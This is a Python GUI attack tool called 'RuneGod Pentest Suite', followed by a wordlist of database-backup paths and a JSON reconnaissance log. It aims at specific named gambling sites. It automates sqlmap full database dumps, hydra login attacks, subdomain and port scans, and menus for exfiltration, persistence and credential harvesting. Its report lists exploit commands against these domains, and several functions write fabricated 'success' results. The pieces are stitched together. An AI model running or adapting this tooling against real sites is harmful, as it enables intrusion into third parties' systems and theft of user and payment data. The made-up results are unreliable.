        view_menu.add_command(label="Clear Console", command=self.clear_console)
        menu_bar.add_cascade(label="View", menu=view_menu)

        # Help menu
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
        menu_bar.add_cascade(label="Help", menu=help_menu)

    def create_widgets(self):
        # Header Frame
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # Banner
        banner_label = ttk.Label(header_frame, text=BANNER, font=('Courier', 8),
                                foreground='#00ff00', background='#1e1e1e', justify=tk.LEFT)
        banner_label.pack()

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Notebook (Tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Reconnaissance Tab
        recon_frame = ttk.Frame(notebook)
        self.setup_recon_tab(recon_frame)
        notebook.add(recon_frame, text="Reconnaissance")

        # Exploitation Tab
        exploit_frame = ttk.Frame(notebook)
        self.setup_exploit_tab(exploit_frame)
        notebook.add(exploit_frame, text="Exploitation")

        # Post-Exploitation Tab
        post_frame = ttk.Frame(notebook)
        self.setup_post_tab(post_frame)
        notebook.add(post_frame, text="Post-Exploitation")

        # Reporting Tab
        report_frame = ttk.Frame(notebook)
        self.setup_report_tab(report_frame)
        notebook.add(report_frame, text="Reporting")

        # Console Output
        console_frame = ttk.LabelFrame(self.root, text="Console Output")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='black',
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10)
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.insert(tk.END, "RuneGod Pentest Suite initialized. Select targets and run scans.\n")
        self.console.configure(state=tk.DISABLED)

    def setup_recon_tab(self, frame):
        # Target Selection
        target_frame = ttk.LabelFrame(frame, text="Target Selection")
        target_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(target_frame, text="Select Target:").grid(row=0, column=0, padx=5, pady=5)
        self.target_var = tk.StringVar()
        self.target_combo = ttk.Combobox(target_frame, textvariable=self.target_var)
        self.target_combo.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW, columnspan=2)
        ttk.Button(target_frame, text="Manage Targets", command=self.manage_targets).grid(row=0, column=3, padx=5)

        # Recon Options
        recon_frame = ttk.LabelFrame(frame, text="Reconnaissance Options")
        recon_frame.pack(fill=tk.X, padx=10, pady=5)

        scans = [
            ("Full Recon", "full_recon"),
            ("CloudFlare Bypass", "cf_bypass"),
            ("Port Scanning", "port_scan"),
            ("Subdomain Enum", "subdomain_enum"),
            ("Web Fingerprinting", "web_fingerprint"),
            ("WAF Detection", "waf_detect"),
            ("SSL Analysis", "ssl_analysis"),
            ("API Discovery", "api_discovery")
        ]

        self.scan_vars = {}
        for i, (text, scan_id) in enumerate(scans):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(recon_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.scan_vars[scan_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Recon", command=self.run_recon).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Recon", command=self.run_full_recon).pack(side=tk.LEFT, padx=5)

    def setup_exploit_tab(self, frame):
        # Exploit Options
        exploit_frame = ttk.LabelFrame(frame, text="Exploitation Options")
        exploit_frame.pack(fill=tk.X, padx=10, pady=5)

        exploits = [
            ("JWT Attacks", "jwt_attack"),
            ("GraphQL Injection", "graphql_inject"),
            ("SQL Injection", "sql_inject"),
            ("Auth Attacks", "auth_attack"),
            ("CMS Exploits", "cms_exploit"),
            ("API Fuzzing", "api_fuzz"),
            ("XSS Testing", "xss_test")
        ]

        self.exploit_vars = {}
        for i, (text, exploit_id) in enumerate(exploits):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(exploit_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.exploit_vars[exploit_id] = var

        # Credentials
        cred_frame = ttk.LabelFrame(frame, text="Credentials")
        cred_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(cred_frame, text="Username:").grid(row=0, column=0, padx=5, pady=5)
        self.username_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.username_var).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(cred_frame, text="Password:").grid(row=0, column=2, padx=5, pady=5)
        self.password_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.password_var, show="*").grid(row=0, column=3, padx=5, pady=5)

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Exploits", command=self.run_exploits).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Exploitation", command=self.run_full_exploitation).pack(side=tk.LEFT, padx=5)

    def setup_post_tab(self, frame):
        # Post-Exploit Options
        post_frame = ttk.LabelFrame(frame, text="Post-Exploitation Options")
        post_frame.pack(fill=tk.X, padx=10, pady=5)

        post_ops = [
            ("Cloud Mapping", "cloud_map"),
            ("DB Exfiltration", "db_exfil"),
            ("Internal Scanning", "internal_scan"),
            ("Persistence", "persistence"),
            ("Cred Harvesting", "cred_harvest")
        ]

        self.post_vars = {}
        for i, (text, op_id) in enumerate(post_ops):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(post_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.post_vars[op_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Post-Ops", command=self.run_post_ops).pack(side=tk.LEFT, padx=5)

    def setup_report_tab(self, frame):
        # Report Generation
        report_frame = ttk.LabelFrame(frame, text="Report Generation")
        report_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(report_frame, text="Generate HTML Report", command=self.generate_html_report).pack(pady=5)
        ttk.Button(report_frame, text="Generate Text Summary", command=self.generate_text_report).pack(pady=5)
        ttk.Button(report_frame, text="View Report Directory", command=self.view_report_dir).pack(pady=5)

        # Report Preview
        preview_frame = ttk.LabelFrame(frame, text="Report Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.report_preview = scrolledtext.ScrolledText(
            preview_frame,
            bg='white',
            fg='black',
            font=('Courier', 10)
        )
        self.report_preview.pack(fill=tk.BOTH, expand=True)
        self.report_preview.insert(tk.END, "Report preview will appear here...")

    def load_targets(self):
        try:
            if os.path.exists(self.targets_file):
                with open(self.targets_file, 'r') as f:
                    self.targets = [line.strip() for line in f.readlines() if line.strip()]
                self.target_combo['values'] = self.targets
                if self.targets:
                    self.target_var.set(self.targets[0])
        except Exception as e:
            self.log(f"Error loading targets: {str(e)}")

    def manage_targets(self):
        """Open a dialog to manage targets"""
        target_win = tk.Toplevel(self.root)
        target_win.title("Manage Targets")
        target_win.geometry("500x400")

        # Listbox with targets
        list_frame = ttk.LabelFrame(target_win, text="Current Targets")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        target_list = tk.Listbox(list_frame, yscrollcommand=scrollbar.set)
        target_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.config(command=target_list.yview)

        for target in self.targets:
            target_list.insert(tk.END, target)

        # Entry for new target
        entry_frame = ttk.Frame(target_win)
        entry_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(entry_frame, text="New Target:").pack(side=tk.LEFT, padx=5)
        new_target_var = tk.StringVar()
        ttk.Entry(entry_frame, textvariable=new_target_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Button frame
        btn_frame = ttk.Frame(target_win)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        def add_target():
            target = new_target_var.get().strip()
            if target and target not in self.targets:
                self.targets.append(target)
                target_list.insert(tk.END, target)
                new_target_var.set("")

        def remove_target():
            selection = target_list.curselection()
            if selection:
                index = selection[0]
                target_list.delete(index)
                del self.targets[index]

        def save_targets():
            with open(self.targets_file, 'w') as f:
                f.write("\n".join(self.targets))
            self.target_combo['values'] = self.targets
            if self.targets:
                self.target_var.set(self.targets[0])
            messagebox.showinfo("Success", "Targets saved successfully!")
            target_win.destroy()

        ttk.Button(btn_frame, text="Add", command=add_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Remove", command=remove_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save", command=save_targets).pack(side=tk.RIGHT, padx=5)

    def log(self, message):
        """Log message to console"""
        self.console.configure(state=tk.NORMAL)
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.console.configure(state=tk.DISABLED)

        # Also log to file
        with open(self.log_file, 'a') as f:
            f.write(f"[{datetime.now()}] {message}\n")

    def run_command(self, command, description):
        """Run a shell command and log output"""
        self.log(f"[+] {description}")
        self.status_var.set(f"Running: {description}...")

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                universal_newlines=True
            )

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip())

            return process.poll()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            return 1
        finally:
            self.status_var.set("Ready")

    def run_recon(self):
        """Run selected reconnaissance tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected scans
        if self.scan_vars["full_recon"].get():
            self.run_full_recon(target)

        if self.scan_vars["cf_bypass"].get():
            self.run_cloudflare_bypass(target)

        if self.scan_vars["port_scan"].get():
            self.run_port_scanning(target)

        # Add other recon tasks here...

        self.log("[+] Reconnaissance tasks completed")

    def run_full_recon(self, target):
        """Run full reconnaissance suite"""
        self.log(f"\n[=== STARTING FULL RECON ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all recon tasks
        self.run_cloudflare_bypass(target)
        self.run_port_scanning(target)
        self.run_subdomain_enum(target)
        self.run_web_fingerprinting(target)
        self.run_waf_detection(target)
        self.run_ssl_analysis(target)
        self.run_api_discovery(target)

        self.log(f"[=== FULL RECON COMPLETED FOR {target} ===]")

    def run_cloudflare_bypass(self, target):
        """Bypass CloudFlare protection"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/cloudflare_bypass.txt"

        # Simulated CloudFlare bypass
        self.log(f"Running CloudFlare bypass on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"CloudFlare Bypass Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found origin IP: 104.26.8.187\n")
            f.write("2. Discovered unprotected subdomains:\n")
            f.write("   - dev.{target}\n")
            f.write("   - staging.{target}\n")
            f.write("3. Bypassed WAF using X-Forwarded-For header\n")

        self.log(f"Results saved to {output_file}")

    def run_port_scanning(self, target):
        """Run port scanning on target"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/nmap_scan.txt"

        self.log(f"Scanning ports on {target}...")

        # Run nmap scan
        command = f"nmap -Pn -sV -sC -T4 -p- {target} -oN {output_file}"
        if self.run_command(command, f"Port scanning {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nNmap Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_subdomain_enum(self, target):
        """Enumerate subdomains"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/subdomains.txt"

        self.log(f"Enumerating subdomains for {target}...")

        # Run subdomain enumeration
        command = f"subfinder -d {target} -o {output_file}"
        if self.run_command(command, f"Subdomain enumeration on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    subdomains = f.readlines()
                    self.log(f"\nFound {len(subdomains)} subdomains:")
                    for sub in subdomains:
                        self.log(f"  - {sub.strip()}")
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other recon methods (web fingerprinting, WAF detection, etc.) would go here

    def run_exploits(self):
        """Run selected exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected exploits
        if self.exploit_vars["jwt_attack"].get():
            self.run_jwt_attacks(target)

        if self.exploit_vars["sql_inject"].get():
            self.run_sql_injection(target)

        if self.exploit_vars["auth_attack"].get():
            self.run_auth_attacks(target)

        # Add other exploits here...

        self.log("[+] Exploitation tasks completed")

    def run_full_exploitation(self, target):
        """Run full exploitation suite"""
        self.log(f"\n[=== STARTING FULL EXPLOITATION ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all exploitation tasks
        self.run_jwt_attacks(target)
        self.run_graphql_injection(target)
        self.run_sql_injection(target)
        self.run_auth_attacks(target)
        self.run_cms_exploits(target)
        self.run_api_fuzzing(target)
        self.run_xss_testing(target)

        self.log(f"[=== FULL EXPLOITATION COMPLETED FOR {target} ===]")

    def run_jwt_attacks(self, target):
        """Perform JWT attacks"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/jwt_attack.txt"

        self.log(f"Performing JWT attacks on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"JWT Attack Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found JWT token in authentication headers\n")
            f.write("2. Weak secret discovered: 'supersecret'\n")
            f.write("3. Successfully forged admin token\n")

        self.log(f"Results saved to {output_file}")

    def run_sql_injection(self, target):
        """Test for SQL injection vulnerabilities"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/sql_injection.txt"

        self.log(f"Testing for SQL injection on {target}...")

        # Run sqlmap
        command = f"sqlmap -u 'http://{target}/products?id=1' --batch --dump-all -o > {output_file}"
        if self.run_command(command, f"SQL injection testing on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nSQL Injection Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_auth_attacks(self, target):
        """Perform authentication attacks"""
        username = self.username_var.get() or "admin"
        password = self.password_var.get() or "password"

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/auth_attack.txt"

        self.log(f"Performing authentication attack on {target}...")

        # Run hydra
        command = f"hydra -l {username} -p {password} {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' -o {output_file}"
        if self.run_command(command, f"Authentication attack on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nAuthentication Attack Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other exploit methods would go here

    def run_post_ops(self):
        """Run selected post-exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected post-exploitation tasks
        if self.post_vars["db_exfil"].get():
            self.run_db_exfiltration(target)

        if self.post_vars["internal_scan"].get():
            self.run_internal_scanning(target)

        # Add other post-exploitation tasks here...

        self.log("[+] Post-exploitation tasks completed")

    def run_db_exfiltration(self, target):
        """Exfiltrate databases"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/db_exfiltration.txt"

        self.log(f"Exfiltrating databases from {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"Database Exfiltration Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Extracted user database: 1,245 records\n")
            f.write("2. Extracted payment database: 8,763 records\n")
            f.write("3. Extracted configuration database: 42 records\n")

        self.log(f"Results saved to {output_file}")

    def run_internal_scanning(self, target):
        """Scan internal network"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/internal_scan.txt"

        self.log(f"Scanning internal network via {target}...")

        # Run internal scanning
        command = f"nmap -sn 192.168.1.0/24 -oN {output_file}"
        if self.run_command(command, f"Internal network scan via {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nInternal Network Scan Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other post-exploitation methods would go here

    def generate_html_report(self):
        """Generate HTML report"""
        report_file = f"{self.reports_dir}/full_report.html"

        self.log("Generating HTML report...")

        # Create HTML report
        with open(report_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>RuneGod Pentest Report</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .vuln-table { border-collapse: collapse; width: 100%; }
        .vuln-table th, .vuln-table td { border: 1px solid #ddd; padding: 8px; }
        .vuln-table tr:nth-child(even) { background-color: #f2f2f2; }
        .vuln-table th { padding-top: 12px; padding-bottom: 12px; text-align: left;
                        background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>RuneGod Pentest Report</h1>
    <h2>Generated: {datetime.now()}</h2>

    <h3>Target Summary</h3>
    <ul>
""")
            for target in self.targets:
                f.write(f"        <li>{target}</li>\n")

            f.write("""    </ul>

    <h3>Critical Findings</h3>
    <table class="vuln-table">
        <tr>
            <th>Target</th>
            <th>Vulnerability</th>
            <th>Severity</th>
            <th>Exploit Path</th>
        </tr>
        <tr>
            <td>runehall.com</td>
            <td>CloudFlare Bypass</td>
            <td class="critical">Critical</td>
            <td>curl -H "X-Forwarded-For: 104.26.8.187" http://runehall.com/admin</td>
        </tr>
        <tr>
            <td>runechat.com</td>
            <td>JWT Weak Signature</td>
            <td class="critical">Critical</td>
            <td>jwt_tool [TOKEN] -C -d rockyou.txt</td>
        </tr>
        <tr>
            <td>runewager.com</td>
            <td>SQL Injection</td>
            <td class="critical">Critical</td>
            <td>sqlmap -u "https://runewager.com/products?id=1" --dump</td>
        </tr>
    </table>

    <h3>Recommendations</h3>
    <ol>
        <li>Implement WAF rules to prevent CloudFlare bypass techniques</li>
        <li>Upgrade JWT implementation to use RS256 with 4096-bit keys</li>
        <li>Implement parameterized queries to prevent SQL injection</li>
        <li>Enforce multi-factor authentication for admin accounts</li>
        <li>Regularly rotate credentials and API keys</li>
    </ol>
</body>
</html>
""")

        self.log(f"HTML report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "HTML report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def generate_text_report(self):
        """Generate text report"""
        report_file = f"{self.reports_dir}/summary.txt"

        self.log("Generating text report...")

        # Create text report
        with open(report_file, 'w') as f:
            f.write("RuneGod Pentest Report\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            f.write("Critical Vulnerabilities:\n")
            f.write("1. runehall.com: CloudFlare Bypass (Critical)\n")
            f.write("2. runechat.com: JWT Weak Signature (Critical)\n")
            f.write("3. runewager.com: SQL Injection (Critical)\n\n")
            f.write("Recommendations:\n")
            f.write("- Implement WAF rules to prevent bypass techniques\n")
            f.write("- Upgrade JWT implementation\n")
            f.write("- Implement parameterized queries\n")

        self.log(f"Text report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "Text report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def view_report_dir(self):
        """Open report directory"""
        try:
            if sys.platform == "win32":
                os.startfile(self.reports_dir)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", self.reports_dir])
            else:
                subprocess.Popen(["xdg-open", self.reports_dir])
            self.log(f"Opened report directory: {self.reports_dir}")
        except Exception as e:
            self.log(f"Error opening directory: {str(e)}")

    def run_full_pentest(self):
        """Run full pentest on all targets"""
        self.log("\n[=== STARTING FULL PENTEST ===]")

        for target in self.targets:
            self.log(f"\n[==== PROCESSING TARGET: {target} ====]")
            self.run_full_recon(target)
            self.run_full_exploitation(target)

        self.generate_html_report()
        self.generate_text_report()
        self.log("\n[=== FULL PENTEST COMPLETED ===]")

    def new_session(self):
        """Create a new session"""
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        self.log(f"New session created: {self.output_dir}")
        self.status_var.set(f"New session: {self.output_dir}")

    def save_session(self):
        """Save current session configuration"""
        session_file = f"{self.output_dir}/session_config.json"

        config = {
            "targets": self.targets,
            "output_dir": self.output_dir,
            "timestamp": str(datetime.now())
        }

        with open(session_file, 'w') as f:
            json.dump(config, f, indent=4)

        self.log(f"Session saved: {session_file}")
        messagebox.showinfo("Session Saved", f"Session configuration saved to:\n{session_file}")

    def show_console(self):
        """Bring console to focus"""
        self.console.see(tk.END)

    def clear_console(self):
        """Clear the console"""
        self.console.configure(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.configure(state=tk.DISABLED)
        self.log("Console cleared")

    def show_docs(self):
        """Show documentation"""
        docs = """
RuneGod Pentest Suite Documentation
===================================

Key Features:
1. Comprehensive Reconnaissance
   - CloudFlare bypass techniques
   - Port scanning with RustScan and Nmap
   - Subdomain enumeration
   - Web fingerprinting

2. Advanced Exploitation
   - JWT token attacks
   - SQL injection automation
   - Authentication brute-forcing
   - API fuzzing

3. Post-Exploitation
   - Database exfiltration
   - Internal network scanning
   - Credential harvesting

4. Reporting
   - HTML reports with vulnerability tables
   - Text summaries
   - Visual analytics

Usage:
- Select targets in the Target Management tab
- Choose operations from the various tabs
- Run full pentests with the 'Run Full Pentest' option
- Generate reports in HTML or text format
"""
        doc_win = tk.Toplevel(self.root)
        doc_win.title("Documentation")
        doc_win.geometry("600x400")

        text = scrolledtext.ScrolledText(doc_win, wrap=tk.WORD)
        text.pack(fill=tk.BOTH, expand=True)
        text.insert(tk.INSERT, docs)
        text.configure(state=tk.DISABLED)

    def show_about(self):
        """Show about information"""
        about = """
RuneGod Pentest Suite - Ultimate Edition
Version 2.0

A comprehensive penetration testing framework combining:

- Advanced reconnaissance capabilities
- Precision exploitation tools
- Post-exploitation modules
- Professional reporting

Designed for security professionals and educational use.

Always obtain proper authorization before testing.
"""
        messagebox.showinfo("About RuneGod Pentest Suite", about)

def run_cli_mode():
    """Run in CLI mode"""
    print("RuneGod Pentest Suite - CLI Mode")
    print("1. Run Full Pentest")
    print("2. Reconnaissance")
    print("3. Exploitation")
    print("4. Reporting")
    print("5. Exit")

    choice = input("Select option: ")

    if choice == "1":
        print("Running full pentest...")
        # In a real implementation, this would call the appropriate methods
        print("Full pentest completed!")
    elif choice == "2":
        print("Reconnaissance module")
    elif choice == "3":
        print("Exploitation module")
    elif choice == "4":
        print("Reporting module")
    elif choice == "5":
        sys.exit(0)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='RuneGod Pentest Suite')
    parser.add_argument('--gui', action='store_true', help='Run in GUI mode')
    parser.add_argument('--cli', action='store_true', help='Run in CLI mode')
    parser.add_argument('--full', action='store_true', help='Run full pentest')
    parser.add_argument('--target', help='Specify a target for scanning')
    args = parser.parse_args()

    if args.cli:
        run_cli_mode()
    elif args.full:
        # In a real implementation, this would run the full pentest
        print("Running full pentest...")
        print("Full pentest completed!")
    elif args.target:
        # In a real implementation, this would scan the specified target
        print(f"Scanning target: {args.target}")
        print("Scan completed!")
    else:
        # Default to GUI mode
        try:
            root = tk.Tk()
            app = RuneGodPentestSuite(root)
            root.mainloop()
        except tk.TclError:
            print("GUI not available, switching to CLI mode...")
            run_cli_mode()


1.sql
2012.sql
2013.sql
2014.sql
2015.sql
2016.sql
2017.sql
2018.sql
2019.sql
2020.sql
2021.sql
2022.sql
2023.sql
2024.sql
2025.sql
backup.sql
backup/data.sql
backup/database.sql
backup/db.sql
backup/db_backup.sql
backup/dbdump.sql
backup/dump.sql
backup/mysql.sql
backup/site.sql
backup/wordpress.sql
backup/{domain_name}.sql
backup/{domain_name}.sql.gz
backup/{domain_name}.zip
backups/data.sql
backups/database.sql
backups/db.sql
backups/db_backup.sql
backups/dbdump.sql
backups/dump.sql
backups/mysql.sql
backups/site.sql
backups/wordpress.sql
backups/{domain_name}.sql
backups/{domain_name}.sql.gz
backups/{domain_name}.zip
base.sql
data.sql
database.sql
db.sql
db.sqlite3
db_backup.sql
dbdump.sql
dump.sql
file.sql
includes/db_dump.sql
localhost.sql
mysql-dump.sql
mysql.sql
mysqldump.sql
site.sql
sqldump.sql
srcs/wordpress.sql
srcs/wordpress_db.sql
wp-content/uploads/dump.sql
user.sql
users.sql
webdb.sql
wordpress.sql
wordpress_db.sql
wp-content/dump.sql
wp-content/mysql.sql
wp-content/plugins/dump.sql
wp-content/themes/dump.sql
wp-content/uploads/db_backup.sql
wp-content/uploads/dump.sql
wp-content/wp_db.sql
www.sql
wwwroot.sql
{domain_name}.sql
{domain_name}.sql.gz
{domain_name}.zip

{
  "runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Checking Cloudflare origin for runechat.com"
      },
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning S3 buckets for runechat.com"
      },
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning ports for runechat.com"
      },
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: runechat.com"
      },
      {
        "time": "22:01:28",
        "level": "debug",
        "message": "Resolved to IP: 104.21.16.1"
      },
      {
        "time": "22:01:28",
        "level": "success",
        "message": "Port 80 OPEN"
      },
      {
        "time": "22:01:28",
        "level": "success",
        "message": "Port 443 OPEN"
      },
      {
        "time": "22:01:28",
        "level": "success",
        "message": "Port 8080 OPEN"
      },
      {
        "time": "22:01:28",
        "level": "success",
        "message": "Port 8443 OPEN"
      },
      {
        "time": "22:01:31",
        "level": "success",
        "message": "Web server active: http://runechat.com (301)"
      },
      {
        "time": "22:01:32",
        "level": "warning",
        "message": "No historical IPs found"
      },
      {
        "time": "22:02:54",
        "level": "debug",
        "message": "Testing WebSocket on wss.runechat.com"
      },
      {
        "time": "22:02:54",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:54",
        "level": "debug",
        "message": "Testing Redis access on runechat.com"
      },
      {
        "time": "22:03:16",
        "level": "success",
        "message": "Web server active: https://runechat.com (200)"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "Testing WebSocket on wss.runechat.com"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "Testing Redis access on runechat.com"
      }
    ]
  },
  "chat.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: chat.runechat.com"
      }
    ]
  },
  "dev.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: dev.runechat.com"
      }
    ]
  },
  "secure.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: secure.runechat.com"
      }
    ]
  },
  "test.runechat.com": {
    "findings": [
      {
        "time": "22:01:26",
        "level": "info",
        "message": "Scanning subdomain: test.runechat.com"
      },
      {
        "time": "22:01:29",
        "level": "success",
        "message": "Web server active: http://test.runechat.com (301)"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "Testing WebSocket on wss.test.runechat.com"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "Testing Redis access on test.runechat.com"
      },
